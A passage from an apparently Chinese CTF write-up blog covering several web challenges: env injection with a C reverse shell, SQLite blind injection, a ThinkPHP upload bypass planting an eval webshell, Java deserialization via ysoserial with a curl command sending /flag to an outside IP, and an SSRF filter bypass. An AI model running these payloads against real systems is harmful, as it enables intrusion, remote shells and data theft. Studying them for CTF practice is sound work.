</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  attacker_addr.sin_family = AF_INET;</span><br><span class="line">  attacker_addr.sin_port = htons(server_port);</span><br><span class="line">  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACTF&#123;s1mple_3nv_1nj3ct1on_and_w1sh_y0u_hav3_a_g00d_tim3_1n_ACTF2022&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h4><p><img src="https://img-blog.csdnimg.cn/ebf69f1fd95d409ca7fcf040fb8cab31.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://123.60.84.229:10218/cgi-bin/hello&#x27;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;BASH_FUNC_env%%&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;() &#123; id;&#125;&quot;</span>)&#125;</span><br><span class="line">r = requests.post(url, files=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：</p>
<p><img src="https://img-blog.csdnimg.cn/d5078fc7c5054e93b948533ae6ca8a3f.png" alt="img"></p>
</blockquote>
<h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><p>开局给投票的源码和数据库内容，可以知道flag就在数据库中，而id存在sql注入，但是ban掉了很多特殊字符和关键词，感觉只能利用盲注了</p>
<p><code>+</code>被ban了导致不能用空格，而且<code>/**/</code>也不能用，所以只能用括号了绕过了</p>
<p><code>vote.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// &quot; % &#x27; * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">&quot;[\&quot;%&#x27;*+\\/&lt;=&gt;\\\\_`~-]&quot;</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">&#x27;\s&#x27;</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;load_extension&#x27;</span>, <span class="string">&#x27;char&#x27;</span>, <span class="string">&#x27;unicode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(in|sub)str&#x27;</span>, <span class="string">&#x27;[lr]trim&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;match&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;limit&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;join&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/json; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a></p>
<p>出题人的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&#x27;http://1d0f96cf-4b45-4ba0-a938-34ada8597dbf.node4.buuoj.cn:81/vote.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] length:&#x27;</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;flag&#123;61aee2ee-4901-43f4-bc12-a87cce7a6087&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&#x27;[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;61aee2ee-4901-43f4-bc12-a87cce7a6087&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>直接给了<code>IndexController</code>的源码，存在一个文件上传的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error(<span class="variable">$upload</span>-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.substr(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随便传一个s，发现报错出现版本为<code>thinkphp3.2.4</code>，直接网上找一下源码下载，直接去看<code>Upload</code>类</p>
<p>感觉可能可以利用的也就只有<code>$info = $upload-&gt;upload() ;</code></p>
<p>那么直接看一下</p>
<h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h4><p>可以发现存在<code>call_user_func</code>方法，会调用回调函数执行<code>$file</code>数组里面的内容，但是这个回调函数我们并不能够修改，所以要想办法该怎么修改这个回调函数捏</p>
<p>想到这道题是文件上传，用到了很多的文件操作函数，那么我们是否可以通过<code>phar://</code>协议来触发反序列化捏，但是简单地看了一遍这和函数之后并没有发现可以触发的地方</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 调用回调函数检测文件是否存在 */</span></span><br><span class="line"><span class="variable">$data</span> = call_user_func(<span class="keyword">$this</span>-&gt;callback, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;callback &amp;&amp; <span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&#x27;.&#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">          <span class="variable">$info</span>[<span class="variable">$key</span>] = <span class="variable">$data</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;removeTrash) &#123;</span><br><span class="line">          call_user_func(<span class="keyword">$this</span>-&gt;removeTrash, <span class="variable">$data</span>); <span class="comment">//删除垃圾据</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这条路走不通，那要不再想想是否可以上传php文件？</p>
<p>但是会发现只能上传图片文件，并且源码中也会判断<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>文件名中是否会出现<code>.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 对图像文件进行严格检测 */</span></span><br><span class="line"><span class="variable">$ext</span> = strtolower(<span class="variable">$file</span>[<span class="string">&#x27;ext&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;bmp&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;swf&#x27;</span>))) &#123;</span><br><span class="line">   <span class="variable">$imginfo</span> = getimagesize(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$imginfo</span>) || (<span class="string">&#x27;gif&#x27;</span> == <span class="variable">$ext</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$imginfo</span>[<span class="string">&#x27;bits&#x27;</span>]))) &#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;error = <span class="string">&#x27;非法图像文件！&#x27;</span>;</span><br><span class="line">       <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在下列代码中对文件名进行了<code>strip_tags</code>操作，会把php和html标识符删掉，那么就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对上传文件数组信息处理</span></span><br><span class="line">        <span class="variable">$files</span> = <span class="keyword">$this</span>-&gt;dealFiles(<span class="variable">$files</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = strip_tags(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>exp：（但是为什么访问这个文件之后直接给了我flag 啊嘞嘞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://bf90b9dc-566d-4408-a099-425349ed8da3.node4.buuoj.cn:81/?s=/&amp;a=upload&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.&lt;&gt;php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_POST[\&#x27;cmd\&#x27;]);?&gt;&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session().post(url, files=files)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// &#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2022-06-26\/62b85e1ac8d12.php&quot;,&quot;success&quot;:1&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>唔，感觉来说，读懂代码已经不是难事了，但是我的思维总是时不时地陷入某个牛角尖，怎么都走不出来</p>
<p>应该说是还是对这些特殊的函数之类不太敏感</p>
<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><ul>
<li><p>java反序列化</p>
<p>存在包：<code>import io.swagger.annotations.ApiOperation;</code></p>
<p>直接访问<code>swagger-ui.html</code>可以得到三个接口</p>
<p>在<code>SqlDict,class</code>中可以发现存在sql注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">    TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">    Table table = <span class="keyword">new</span> Table();</span><br><span class="line">    String sql = <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">    ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/7dfa2ddee3f744f5afc3c309b3d53d01.png"></p>
<p>测试<code>myapp?a=1&#39; or 1=1#</code>的时候可以把<code>user</code>表的信息给爆破出来，发现存在<code>id|name|pwd</code>，那么直接注入获取用户信息登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name:admin</span><br><span class="line">password:admin@Rrrr_ctf_asde</span><br></pre></td></tr></table></figure>

<p>登录之后发现有base64编码的内容，解码之后很容易就能看出来是java序列化出来的字节码，说明存在java反序列化，可以在<code>/common/user/current</code>中进行认证实现java反序列化的触发</p>
<p>直接<code>ysoserial</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;curl 82.156.2.166:8888 -d @/flag&quot; | base64 -w 0</span><br></pre></td></tr></table></figure>

<p>得出来的结果要用curl传，不然监听不到内容</p>
<p>得到flag</p>
<h2 id="网鼎杯-2020-玄武组-SSRFMe"><a href="#网鼎杯-2020-玄武组-SSRFMe" class="headerlink" title="[网鼎杯 2020 玄武组]SSRFMe"></a>[网鼎杯 2020 玄武组]SSRFMe</h2><p>直接给了一点源码，可以发现在方法<code>safe_request_url</code>中存在<code>curl_exec</code>函数导致php的SSRF，所以在<code>check_inner_ip</code>中要返回false并且不能die了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_inner_ip</code>要求使用的协议只能是<code>http|https|gopher|dict</code>，并且要求ip不能是<code>127.0.0.0|10.0.0.0|172.16.0.0|192.168.0.0</code>等格式，但是我们大多数的时候会用到<code>127.0.0.1</code>，所以必须要绕过，可以发现<code>parse_url</code>是存在漏洞的，直接利用它绕过吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;http:///127.0.0.1?url=1&#x27;</span>;</span><br><span class="line">	var_dump(parse_url(<span class="variable">$a</span>)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<h4 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h4><h5 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h5><p>会导致<code>ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16</code>返回true，可以用<code>0.0.0.0</code>绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(gethostbyname(<span class="string">&quot;&quot;</span>)); <span class="comment">//会自动获取本机的ip地址</span></span><br></pre></td></tr></table></figure>

<p><code>hint.php</code>，经典利用base64绕过<code>exit()</code>，但是这里有点难构造因为他会把post传的参数也直接放到了文件内容里面，因为base解码的时候会捕获到最后一个<code>=</code>，所以最终还是没用base，但是试过之后发现写不进去，应该是没有权限</p>
<p><a href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php://filter协议） - yokan - 博客园 (cnblogs.com)</a></p>
